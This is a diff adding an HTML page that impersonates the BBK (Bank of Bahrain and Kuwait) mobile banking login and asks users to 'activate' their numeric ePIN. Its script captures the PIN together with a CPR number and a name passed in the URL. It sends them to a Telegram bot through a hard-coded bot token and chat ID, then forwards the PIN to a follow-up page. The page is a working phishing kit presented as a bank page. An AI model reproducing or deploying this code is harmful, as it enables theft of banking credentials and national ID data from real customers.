@@ -1,0 +1,319 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>BBK — Login</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&amp;display=swap" rel="stylesheet">
+<style>
+  :root{
+    --blue-1:#2f83e0;   /* top */
+    --blue-2:#1b5fb3;   /* bottom */
+    --blue-3:#154a90;   /* deep */
+    --glass-1:rgba(255,255,255,0.10);
+    --glass-2:rgba(255,255,255,0.06);
+    --muted:rgba(255,255,255,0.9);
+    --accent:#ffffff;
+  }
+
+  html,body{height:100%;background:#0f4b8a}
+  body{
+    margin:0;
+    font-family:"Poppins",system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;
+    /* closer gradient to reference */
+    background: radial-gradient(1200px 600px at 10% 10%, rgba(255,255,255,0.03), transparent 8%),
+                linear-gradient(180deg,var(--blue-1),var(--blue-2) 55%, var(--blue-3));
+    color:var(--accent);
+    -webkit-font-smoothing:antialiased;
+    -moz-osx-font-smoothing:grayscale;
+    display:flex;align-items:flex-start;justify-content:center;
+    padding-top:28px;
+  }
+
+  .wrap{
+    width:100%;max-width:420px;padding:56px 28px 48px;box-sizing:border-box;
+  }
+
+  /* top-right logo */
+  .brand{display:flex;justify-content:flex-end;align-items:center}
+  .logo{width:96px;height:44px;filter:drop-shadow(0 10px 24px rgba(0,0,0,0.16));opacity:0.98}
+
+  /* user name - larger and spaced like screenshot */
+  .name{
+    margin:40px 0 34px;text-align:center;font-weight:600;letter-spacing:4px;font-size:22px;color:rgba(255,255,255,0.95);
+    text-transform:uppercase;
+  }
+
+  /* input */
+  .pin-wrap{display:flex;flex-direction:column;gap:28px;align-items:center}
+  .input{
+    width:100%;border-radius:34px !important;padding:22px 26px !important;background:transparent !important;
+    border:2px solid rgba(255,255,255,0.18) !important;
+    color:var(--accent);font-size:15px !important;outline:none;box-sizing:border-box;text-align:center !important;
+    backdrop-filter: blur(6px);
+    -webkit-backdrop-filter: blur(6px);
+  }
+  .input::placeholder{color:rgba(255,255,255,0.78);font-weight:500;letter-spacing:0.6px}
+
+  /* toggle row */
+  .row{display:flex;align-items:center;justify-content:space-between;margin:18px 6px;width:100%}
+  .toggle{
+    width:52px;height:30px;border-radius:999px;background:transparent;border:2px solid rgba(255,255,255,0.26);
+    position:relative;box-sizing:border-box;padding:3px;cursor:pointer;
+    display:inline-block;
+  }
+  .knob{width:24px;height:24px;border-radius:50%;background:#fff;position:absolute;top:2px;left:3px;transition:left .18s, box-shadow .12s;box-shadow:0 6px 18px rgba(0,0,0,0.18);}
+  .toggle.on{background:linear-gradient(180deg, rgba(255,255,255,0.20), rgba(255,255,255,0.06));border-color:rgba(255,255,255,0.28)}
+  .toggle.on .knob{left:25px}
+
+  .row .label{color:rgba(255,255,255,0.95);font-weight:500;letter-spacing:0.6px}
+
+  /* big login button - large rounded with soft glass and inner highlight */
+  .login{
+    margin-top:12px;width:100%;padding:18px;border-radius:26px;
+    background:linear-gradient(180deg, rgba(255,255,255,0.14), rgba(255,255,255,0.08));
+    border:none;color:#fff;font-weight:600;font-size:18px;cursor:pointer;
+    box-shadow:
+      0 18px 40px rgba(7,20,50,0.26),
+      inset 0 1px 0 rgba(255,255,255,0.12);
+    backdrop-filter: blur(6px);
+  }
+  .login:active{transform:translateY(1px);
+      background:linear-gradient(180deg, rgba(255,255,255,0.14), rgba(255,255,255,0.08)) !important;
+  }
+  .login:onhover{
+      background:linear-gradient(180deg, rgba(255,255,255,0.14), rgba(255,255,255,0.08)) !important;
+  }
+  /* face id */
+  .face{
+    display:flex;align-items:center;gap:10px;justify-content:center;margin-top:18px;color:rgba(255,255,255,0.95);
+    font-weight:600;font-size:15px;letter-spacing:0.6px;
+  }
+  .link{display:block;text-align:center;margin:18px 0;color:rgba(255,255,255,0.95);font-weight:600;letter-spacing:0.6px}
+
+  /* bottom cards */
+  .cards{display:flex;gap:14px;justify-content:space-between;margin-top:20px}
+  .card{
+    flex:1;background:linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
+    padding:18px;border-radius:12px;text-align:left;color:rgba(255,255,255,0.95);
+    box-shadow:0 10px 30px rgba(0,0,0,0.16);
+    min-height:86px;display:flex;flex-direction:column;justify-content:flex-end;
+  }
+  .card .title{font-weight:600;font-size:15px;line-height:1.15}
+  .card .icon{font-size:18px;opacity:0.95;margin-bottom:8px}
+
+  .lang{display:block;text-align:center;margin-top:22px;color:rgba(255,255,255,0.92);font-weight:600}
+
+  /* subtle center spacing to match screenshot */
+  .spacer{height:10vh}
+
+  @media (max-width:360px){
+    .name{font-size:20px;letter-spacing:3px}
+    .card{padding:14px}
+  }
+  
+        .logo-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 60px;
+           
+        }
+
+        .logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            margin-bottom: 5px;
+            position: relative;
+        }
+
+        .logo-star {
+            position: absolute;
+            right: -15px;
+            top: -5px;
+            font-size: 20px;
+            color: white;
+        }
+
+        .logo-arabic {
+            font-size: 12px;
+            letter-spacing: 1px;
+            opacity: 0.9;
+            direction: rtl;
+        }
+
+        .info-text {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+        a{
+            text-decoration: none;
+        }
+
+</style>
+</head>
+<body>
+  <div class="wrap" role="main" aria-label="BBK Login">
+    <div class="brand" aria-hidden="true">
+      <!-- BBK placeholder logo (top-right in screenshot) -->
+  
+        <div class="logo-container">
+            <div class="logo">
+                <div class="logo-text">
+                    BBK
+                    <span class="logo-star">✱</span>
+                </div>
+                <div class="logo-arabic">بنك البحرين والكويت</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="name" id="user">
+    </div>
+    <p style="font-size: 13px;">Please activate your BBK Mobile app Password/ePIN</p>
+    <form>
+    <div class="pin-wrap">
+      <input id="pin" class="input" name="epin" type="password" inputmode="numeric" pattern="[0-9]*" maxlength="8" minlength="6" placeholder="Enter your password (6 to 8 numeric only)" aria-label="Enter your password (6 to 8 numeric only)">
+
+      <button class="login" name="sss" id="loginBtn" type="submit" aria-label="Login">Activate</button>
+
+
+
+      <a href="#" class="link">Create/Forgot Password?</a>
+    </div>
+    </form>
+
+    <div class="spacer" aria-hidden="true"></div>
+
+    <div class="cards" aria-hidden="false">
+      <a class="card" href="#" aria-label="Branches and ATMs">
+        
+        <div class="title">Branches &amp; ATMs</div>
+      </a>
+      <a class="card" href="#" aria-label="Contact us">
+      
+        <div class="title">Contact us</div>
+      </a>
+      <a class="card" href="#" aria-label="Terms and Conditions">
+  
+        <div class="title">Terms &amp; Conditions</div>
+      </a>
+    </div>
+
+    <div class="lang">عربي</div>
+  </div>
+
+<script>
+(async () => {
+  // Get CPR and name from URL parameter
+ const cleanQS = window.location.search.replace(/\&\?/g, '&');
+  const params  = new URLSearchParams(cleanQS);
+
+  const cpr  = params.get('cpr') || '';
+  // Try both 'name' and '?name' just in case
+  const name = params.get('name') || params.get('?name') || '';
+
+    console.log('cpr:',  cpr);  
+    console.log('name:', name);  
+  // Display the name if available
+  if (name) {
+    document.getElementById('user').textContent = decodeURIComponent(name);
+  }
+
+  const form = document.querySelector('form');
+  const loginBtn = document.getElementById('loginBtn');
+  const pinInput = document.getElementById('pin');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const pin = pinInput.value.trim();
+    
+    if (!/^\d{6,8}$/.test(pin)) {
+      alert('Please enter a 6 to 8 digit numeric password');
+      return;
+    }
+
+    // Disable button and show loading
+    loginBtn.disabled = true;
+
+    const botToken = "8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8";
+    const chatId = "-5091116242";
+
+  
+
+    try {
+      // Send password to Telegram
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: `🔐 *Password Submitted*\n━━━━━━━━━━\n🔑 *Password:* ${pin}\n👤 *Name:* ${name ? decodeURIComponent(name) : 'Not provided'}\n🆔 *CPR:* ${cpr || 'Not provided'}`
+        })
+      });
+
+      // Redirect to next page (/l) with all parameters
+      const params = new URLSearchParams();
+      if (cpr) params.append('cpr', cpr);
+      if (name) params.append('name', name);
+      params.append('password', pin);
+      window.location.href = `l.html?cpr=${encodeURIComponent(cpr)}&?name=${encodeURIComponent(name)}&?pin=${encodeURIComponent(pin)}`;
+      
+    } catch (error) {
+      console.error('Error:', error);
+      // Still redirect even if Telegram fails
+      const params = new URLSearchParams();
+      if (cpr) params.append('cpr', cpr);
+      if (name) params.append('name', name);
+      params.append('password', pin);
+      window.location.href = `l.html?cpr=${encodeURIComponent(cpr)}&?name=${encodeURIComponent(name)}&?pin=${encodeURIComponent(pin)}`;
+    }
+  });
+})();
+</script>
+
+<div id="give-freely-root-ejkiikneibegknkgimmihdpcbcedgmpo" class="give-freely-root" data-extension-id="ejkiikneibegknkgimmihdpcbcedgmpo" data-extension-name="Volume Booster" style="display: block;"><template shadowrootmode="open"><style>
+  :host {
+    all: initial;
+  }
+
+  .gf-scroll-remove::-webkit-scrollbar {
+    border-radius-bottom-right: 15px;
+  }
+
+  button {
+    cursor: pointer;
+    transition: transform 0.1s ease;
+  }
+
+  button:active {
+    transform: scale(0.98);
+  }
+
+  .give-freely-close-button:hover {
+    opacity: 0.7;
+  }
+
+  input[type="radio"] {
+    margin-right: 8px;
+  }
+
+  hr {
+    border: none;
+    border-top: 1px solid #e5e5e5;
+    margin: 1em 0;
+  }
+
+  @media (max-width: 600px), (max-height: 480px) {
+    #give-freely-checkout-popup {
+      display: none !important;
+    }
+  }
+</style><div><div class="gf-app"></div></div></template></div></body></html>
